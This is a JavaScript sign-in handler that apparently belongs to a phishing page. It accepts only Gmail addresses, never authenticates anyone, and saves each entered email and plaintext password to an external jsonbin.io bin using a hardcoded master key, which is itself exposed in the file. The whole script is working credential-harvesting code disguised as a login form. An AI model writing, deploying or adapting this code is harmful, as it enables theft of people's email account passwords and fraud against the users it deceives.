document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("sign-in-btn").addEventListener("click", handleSignIn);

    async function handleSignIn(event) {
        event.preventDefault();

        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password")?.value.trim();
        const apiKey = "$2a$10$KxrIzD6vk0We8pfpySnbfOvkTSyr5i/RKwnItuvXA0KYkMEPRo/zC"; 
        // const binId = "67eaad1a8561e97a50f63560";    
        const binId = "67ea9e3a8a456b79667ff984";


        if (!email.includes("@gmail.com")) {
            alert("Invalid email. Please use a valid Gmail address.");
            return;
        }

        try {
            let response = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
                headers: {
                    "X-Master-Key": apiKey
                }
            });

            if (!response.ok) throw new Error("Failed to fetch existing data.");
            
            let data = await response.json();
            if (!data.record.contacts) data.record.contacts = [];

            data.record.contacts.push({ email, password: password || "N/A" });

            response = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
                method: "PUT",
                headers: {
                    "Content-Type": "application/json",
                    "X-Master-Key": apiKey
                },
                body: JSON.stringify(data.record)
            });

            if (!response.ok) throw new Error("Failed to save data.");

            // alert("Contact saved successfully!");
        } catch (error) {
            console.error("Error:", error);
            alert("An error occurred. Please try again later.");
        }
    }
});

